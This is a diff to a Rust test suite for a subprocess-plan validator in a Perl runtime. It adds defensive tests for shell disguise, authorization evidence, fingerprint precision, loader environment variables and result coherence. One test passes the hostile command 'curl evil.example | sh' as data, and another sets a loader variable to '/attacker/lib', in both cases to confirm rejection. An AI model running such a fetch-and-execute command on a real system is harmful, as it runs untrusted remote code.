@@ -1002,7 +1002,7 @@ fn result_with(
         ),
         perl_subprocess_runtime::process::WorkMetadata::default(),
         Vec::new(),
-    ))
+    )?)
 }
 
 #[test]
@@ -1453,7 +1453,7 @@ fn the_canonical_encoding_of_a_fixture_plan_is_locked_to_the_schema_version() ->
     // A meaning change without a schema-version move fails here. When the
     // encoding legitimately changes, move PROCESS_DOMAIN_SCHEMA_VERSION and
     // update this constant in the same commit.
-    const LOCKED_FINGERPRINT: &str = "4e12acd15f88bdd2955ceeb7a54819b3";
+    const LOCKED_FINGERPRINT: &str = "1ec851f73284fbebad7abfd4c5662ac8";
     let actual = valid_linux_one_shot().semantic_fingerprint().to_string();
     assert_eq!(PROCESS_DOMAIN_SCHEMA_VERSION.get(), 1);
     assert_eq!(actual, LOCKED_FINGERPRINT);
@@ -1947,5 +1947,274 @@ fn stdin_content_identifies_a_plan_while_its_bytes_stay_out_of_the_encoding() ->
         with_stdin(b"print 2;").semantic_fingerprint(),
         "differing stdin content must give differing plan identities"
     );
+    Ok(())
+}
+
+// ────────────────── controls added after external bot review ──────────────────
+
+#[test]
+fn a_multibyte_argument_cannot_crash_the_validator() -> TestResult {
+    // The wrong implementation this kills: comparing an inline-command prefix
+    // with `arg[..prefix.len()]`, which panics when that byte index lands
+    // inside a multi-byte character. Arguments are arbitrary caller text, so a
+    // plan containing an accented word would terminate the process.
+    // The prefix scan only runs for a shell executable, so the fixture must
+    // use one; with any other program the rule short-circuits before reaching
+    // the argument at all.
+    for argument in ["--commandé", "é", "--comman\u{e9}d", "日本語のひきすう", "--comman"]
+    {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            ExecutableIdentity::resolved(
+                "sh",
+                PrivatePath::new(PathBuf::from("/bin/sh")),
+                ResolutionProvenance::ConfiguredAbsolutePath,
+            ),
+            allow_listed_environment(),
+        )
+        .argv([argument])
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        // Any outcome is acceptable; not returning is not.
+        let _ = plan.validate();
+    }
+    Ok(())
+}
+
+#[test]
+fn a_shell_renamed_by_its_plan_is_still_a_shell() -> TestResult {
+    // The wrong implementation this kills: keying the shell rule on the
+    // caller-supplied logical name, so labelling `/bin/sh` as "perl" buys
+    // unrestricted shell execution through a validated plan.
+    let disguised = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        ExecutableIdentity::resolved(
+            "perl",
+            PrivatePath::new(PathBuf::from("/bin/sh")),
+            ResolutionProvenance::ConfiguredAbsolutePath,
+        ),
+        allow_listed_environment(),
+    )
+    .argv(["-c", "curl evil.example | sh"])
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(
+        matches!(rejection_of(disguised)?, PlanRejection::ShellInvocationRejected { .. }),
+        "a shell relabelled as perl was admitted"
+    );
+    Ok(())
+}
+
+#[test]
+fn authorization_must_identify_a_decision() -> TestResult {
+    // Current, strong evidence that names nothing cannot be verified by any
+    // backend, so it is not evidence.
+    for reference in ["", "   "] {
+        let plan = ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            resolved_perl(),
+            allow_listed_environment(),
+        )
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+        .subject(current_root())
+        .authorization(AuthorizationEvidence::new(
+            SchemaVersion::new(1),
+            reference,
+            EvidenceFreshness::Current,
+            AuthorizationStrength::ExplicitUserAction,
+        ))
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build();
+        assert_eq!(
+            rejection_of(plan)?,
+            PlanRejection::InsufficientAuthorizationEvidence,
+            "empty authorization reference {reference:?} was admitted"
+        );
+    }
+    Ok(())
+}
+
+#[test]
+fn submillisecond_policy_differences_change_the_plan_identity() -> TestResult {
+    // The wrong implementation this kills: encoding a `Duration` as
+    // milliseconds, which collapses every sub-millisecond difference and hands
+    // two plans with different timing behavior one identity.
+    let with_deadline = |deadline: Duration| {
+        ProcessPlan::builder(
+            PlanId::new("plan-1"),
+            OperationId::new("run-file"),
+            OwnerDomain::RunFile,
+            ExecutionProfile::LinuxOneShot,
+            resolved_perl(),
+            allow_listed_environment(),
+        )
+        .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+        .deadline(DeadlinePolicy::Wall(deadline))
+        .termination(TerminationPolicy::ProcessTree {
+            graceful: Duration::from_nanos(500),
+            then_forced: true,
+        })
+        .cancellation(CancellationPolicy::Cooperative { grace: Duration::from_nanos(500) })
+        .subject(current_root())
+        .authorization(user_authorization())
+        .claim_boundary(ClaimBoundary::linux_only())
+        .build()
+    };
+    assert_ne!(
+        with_deadline(Duration::from_nanos(1)).semantic_fingerprint(),
+        with_deadline(Duration::from_nanos(2)).semantic_fingerprint()
+    );
+    assert_ne!(
+        with_deadline(Duration::from_micros(500)).semantic_fingerprint(),
+        with_deadline(Duration::from_micros(600)).semantic_fingerprint()
+    );
+    Ok(())
+}
+
+#[cfg(unix)]
+#[test]
+fn distinct_non_utf8_paths_keep_distinct_identities() -> TestResult {
+    // The wrong implementation this kills: fingerprinting `to_string_lossy()`,
+    // which maps every invalid byte onto U+FFFD, so two different executables
+    // share one public identity.
+    use std::ffi::OsString;
+    use std::os::unix::ffi::OsStringExt;
+
+    let first = PrivatePath::new(PathBuf::from(OsString::from_vec(b"/usr/bin/\xff".to_vec())));
+    let second = PrivatePath::new(PathBuf::from(OsString::from_vec(b"/usr/bin/\xfe".to_vec())));
+    assert_ne!(
+        first.expose().to_string_lossy(),
+        "unreachable",
+        "guard against the fixture silently becoming valid UTF-8"
+    );
+    assert_eq!(
+        first.expose().to_string_lossy(),
+        second.expose().to_string_lossy(),
+        "the fixture must be two paths that a lossy conversion collapses"
+    );
+    assert_ne!(
+        first.fingerprint(),
+        second.fingerprint(),
+        "distinct paths collapsed onto one fingerprint"
+    );
+    Ok(())
+}
+
+#[test]
+fn a_removed_loader_variable_is_not_admitted() -> TestResult {
+    // Removing a variable is as effective as denying it, and the gate must not
+    // demand an acknowledgement for a risk the plan already eliminated.
+    let mut projection =
+        EnvironmentProjection::new("env:1", AmbientInheritance::InheritExceptDenied);
+    for name in CODE_LOADING_VARIABLES {
+        projection = projection.remove(EnvVarName::new(*name));
+    }
+    assert!(projection.admitted_code_loading_variables().is_empty());
+    let plan = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        resolved_perl(),
+        projection,
+    )
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(plan.validate().is_ok());
+    Ok(())
+}
+
+#[test]
+fn a_mixed_case_loader_variable_does_not_evade_the_gate() -> TestResult {
+    // Environment names are case-sensitive on Unix and not on Windows. The
+    // safe reading of that ambiguity is that `Perl5Lib` is the loader variable
+    // it resembles.
+    let projection = EnvironmentProjection::new("env:1", AmbientInheritance::AllowListedOnly)
+        .add(EnvVarName::new("Perl5Lib"), SecretValue::new("/attacker/lib"));
+    let plan = ProcessPlan::builder(
+        PlanId::new("plan-1"),
+        OperationId::new("run-file"),
+        OwnerDomain::RunFile,
+        ExecutionProfile::LinuxOneShot,
+        resolved_perl(),
+        projection,
+    )
+    .cwd(CwdPolicy::ExactDirectory(PrivatePath::new(PathBuf::from("/workspace"))))
+    .deadline(DeadlinePolicy::Wall(Duration::from_secs(5)))
+    .subject(current_root())
+    .authorization(user_authorization())
+    .claim_boundary(ClaimBoundary::linux_only())
+    .build();
+    assert!(matches!(rejection_of(plan)?, PlanRejection::UnacknowledgedCodeLoadingVariable { .. }));
+    Ok(())
+}
+
+#[test]
+fn a_result_cannot_carry_swapped_or_incoherent_stream_evidence() -> TestResult {
+    // The wrong implementation this kills: assembling a result from whatever
+    // evidence a backend hands over, so stdout and stderr can be swapped or
+    // evidence can claim a completeness it does not have.
+    let swapped = result_with(
+        StreamEvidence::complete(StreamChannel::Stderr, b"wrong slot".to_vec()),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::CompletedExit { code: 0 },
+        CleanupDisposition::Completed,
+        TreeDisposition::GroupTerminated,
+    );
+    assert!(swapped.is_err(), "a result accepted stderr evidence in the stdout slot");
+
+    let lying = result_with(
+        StreamEvidence::new(
+            StreamChannel::Stdout,
+            10_000,
+            perl_subprocess_runtime::process::ContentFingerprint::of(b"observed"),
+            b"retained".to_vec(),
+            TruncationState::Complete,
+        ),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::CompletedExit { code: 0 },
+        CleanupDisposition::Completed,
+        TreeDisposition::GroupTerminated,
+    );
+    assert!(lying.is_err(), "a result accepted evidence claiming a completeness it lacks");
+    Ok(())
+}
+
+#[test]
+fn a_completed_exit_cannot_be_paired_with_a_failed_cleanup() -> TestResult {
+    // `TerminalDisposition::elect` already ranks cleanup failure above a
+    // completed exit. Without this check a backend could bypass election and
+    // assemble the contradiction directly, and `is_ordinary_success` would
+    // return true for a run whose cleanup failed.
+    let contradiction = result_with(
+        StreamEvidence::empty(StreamChannel::Stdout),
+        StreamEvidence::empty(StreamChannel::Stderr),
+        TerminalDisposition::CompletedExit { code: 0 },
+        CleanupDisposition::Failed,
+        TreeDisposition::GroupTerminated,
+    );
+    assert!(contradiction.is_err(), "a zero exit was admitted alongside a failed cleanup");
     Ok(())
 }
